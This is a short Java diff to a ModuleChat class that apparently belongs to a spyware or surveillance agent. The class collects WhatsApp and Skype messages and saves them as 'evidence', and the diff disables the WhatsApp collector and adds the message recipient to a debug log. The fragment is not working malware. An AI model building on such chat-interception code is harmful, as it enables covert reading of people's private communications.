@@ -61,7 +61,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 	public ModuleChat() {
 		subModuleManager = new SubModuleManager(this);
 		
-		subModuleManager.add(new ChatWhatsapp());
+		//subModuleManager.add(new ChatWhatsapp());
 		subModuleManager.add(new ChatSkype());
 	}
 
@@ -138,7 +138,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " : "
+				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " -> " + message.to + " : "
 						+ message.message);
 			}
 		}
